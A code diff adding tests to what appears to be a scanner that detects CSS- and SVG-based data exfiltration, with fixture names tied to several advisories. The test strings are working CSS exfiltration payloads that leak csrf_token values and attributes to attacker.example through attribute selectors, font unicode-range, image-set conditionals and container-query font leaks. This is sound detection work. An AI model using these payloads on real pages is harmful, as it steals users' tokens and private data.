@@ -14,11 +14,18 @@ describe("SPEC and CVE_SPEC acceptance criteria", () => {
     expect(hasFinding('input[value^="b"]{background:url(https://example.test/;base64,pwned.png)}')).toBe(true);
     expect(hasFinding('input[value^="b"]{background:url(https://example.test/a.png#;base64,)}')).toBe(true);
     expect(hasFinding('.icon{background:url(data:image/png;base64,iVBORw0KGgo=)}')).toBe(false);
+    expect(hasFinding('input[name="csrf_token"][value^="a"]~.leak{background-image:image-set("https://attacker.example/a.png" 1x)}')).toBe(true);
+    expect(hasFinding('@font-face{font-family:"LeakRange";src:url("https://attacker.example/a.woff2");unicode-range:U+0061}input[name="csrf_token"][value^="a"]~.x{font-family:"LeakRange"}')).toBe(true);
+    expect(hasFinding('div{--v:attr(data-user);background:image-set(if(style(--v:"admin"): "https://attacker.example/admin.png"; else: "https://attacker.example/user.png") 1x)}')).toBe(true);
+    expect(hasFinding('@font-face{font-family:"LeakMetrics";src:url("https://attacker.example/leak.woff2")}.secret{font-family:"LeakMetrics";width:fit-content}@container (min-width:1px){.secret{background:url(https://attacker.example/container)}}')).toBe(true);
+    expect(hasFinding('@font-face{font-family:"LeakStatic";src:url("https://attacker.example/leak.woff2")}.leak{font-family:"LeakStatic";font-feature-settings:"liga" 1;width:fit-content}.leak::before{font-family:"LeakStatic";content:"\\100"}@container (width:11px){head::before{content:url(https://attacker.example/static)}}')).toBe(true);
     expect(hasFinding(':root{--link:url(https://attacker.example/x)}input[value^="x"]{background:var(--link)}')).toBe(true);
     expect(hasFinding(':root{--link:url(https://attacker.example/x)}input[value^="x"]{background:var(--missing,var(--link))}')).toBe(true);
     expect(hasFinding('@supports(display:grid){@media screen{input[value^="x"]{background:url(https://attacker.example/x)}}}')).toBe(true);
     expect(hasFinding('form:has(input[name="token"][value^="x"]){background:url(https://attacker.example/x)}')).toBe(true);
     expect(hasFinding('svg:has(input[name="token"]){fill:url(https://attacker.example/paint.svg#x)}')).toBe(true);
+    expect(hasFinding('input[name="csrf_token"][type="hidden"]{--leaked-secret:attr(value);background-image:image-set(if(style(--leaked-secret:"alpha"): "https://attacker.example/hono-alpha.png"; else: "https://attacker.example/hono-other.png") 1x)}')).toBe(true);
+    expect(hasFinding('.recipe-instructions .step-note{color:#4b5563;border-inline-start:0.25rem solid currentColor}')).toBe(false);
     expect(hasFinding('.message-content .overlay{position:fixed !important;inset:0}')).toBe(false);
   });
 
@@ -33,6 +40,12 @@ describe("SPEC and CVE_SPEC acceptance criteria", () => {
     const summary = scanDocument(document);
     expect(summary.partialFrames).toBeGreaterThan(0);
     expect(summary.findings.some((finding) => finding.reasons.includes("frame.cross_origin.uninspectable"))).toBe(true);
+  });
+
+  it("reports cross-origin SVG resource attributes as actionable remote resource sinks", () => {
+    const documentRef = new DOMParser().parseFromString('<svg><rect filter="url(https://attacker.example/filter.svg#x)"></rect></svg>', "text/html");
+    const summary = scanHtmlResourceAttributes({ documentRef, pageUrl, frameUrl: pageUrl });
+    expect(summary.findings.some((finding) => finding.reasons.includes("sink.svg_resource_remote") && finding.destinationOrigin === "https://attacker.example")).toBe(true);
   });
 
   it("reports external SVG image documents as optional partial coverage", () => {
@@ -54,7 +67,8 @@ describe("SPEC and CVE_SPEC acceptance criteria", () => {
         showPartialAnalysisFindings: true,
         enableFirefoxEnhancedMode: false,
         reportExternalSvgImageDocuments: true,
-        enableSvgImageDnrPolicy: false
+        enableSvgImageDnrPolicy: false,
+        enableContentNeutralization: true
       }
     });
     expect(summary.findings.some((finding) => finding.reasons.includes("resource.svg_image_document.uninspectable"))).toBe(true);
@@ -94,10 +108,46 @@ describe("SPEC and CVE_SPEC acceptance criteria", () => {
       "cve-2026-28348-lxml-html-clean-escaped-import.css",
       "large-stylesheet-full-source-scan-import.css",
       "large-stylesheet-full-source-scan-value-probe.css",
-      "large-stylesheet-full-source-scan-nested.css"
+      "large-stylesheet-full-source-scan-nested.css",
+      "poc-test-1-base64-fragment.css",
+      "poc-test-1-1-base64-path.css",
+      "poc-test-2-css-var-url.css",
+      "poc-test-2-1-css-var-fallback.css",
+      "poc-test-3-supports.css",
+      "poc-test-3-1-media.css",
+      "image-set-string-form.css",
+      "font-face-unicode-range-sensitive.css",
+      "inline-style-attr-if-url.html",
+      "inline-style-attr-if-image-set-string.html",
+      "inline-style-nested-if-chain-url.html",
+      "fontleak-container-query-url.css",
+      "fontleak-keyframes-url.css",
+      "fontleak-static-ligature-container.css",
+      "fontleak-import-chain-container.css",
+      "fontleak-font-chaining-animation.css",
+      "cve-2026-39315-unhead-leading-zero-data-css-link.html",
+      "cve-2026-41159-mermaid-theme-css-scope-escape.css",
+      "cve-2026-41148-mermaid-classdef-breakout.css",
+      "ghsa-vrx2-77f2-ww34-justhtml-preserved-style.html",
+      "ghsa-vrx2-77f2-ww34-justhtml-svg-filter.html",
+      "cve-2026-26000-xwiki-css-exfil-comment.css",
+      "cve-2026-44458-hono-jsx-ssr-inline-style.html",
+      "cve-2026-35046-tandoor-stored-recipe-style.html"
     ]) {
       expect(attacks.has(expected), expected).toBe(true);
       expect(attacks.has(`${expected}.expected.json`), `${expected}.expected.json`).toBe(true);
+    }
+  });
+
+
+  it("has advisory-derived benign fixture names in tests/fixtures", () => {
+    const benign = new Set(readdirSync(join(join(process.cwd(), "tests", "fixtures", "benign"))));
+    for (const expected of [
+      "benign-hono-jsx-ssr-style-object-presentation.html",
+      "benign-tandoor-recipe-presentation-style.html"
+    ]) {
+      expect(benign.has(expected), expected).toBe(true);
+      expect(benign.has(`${expected}.expected.json`), `${expected}.expected.json`).toBe(true);
     }
   });
 
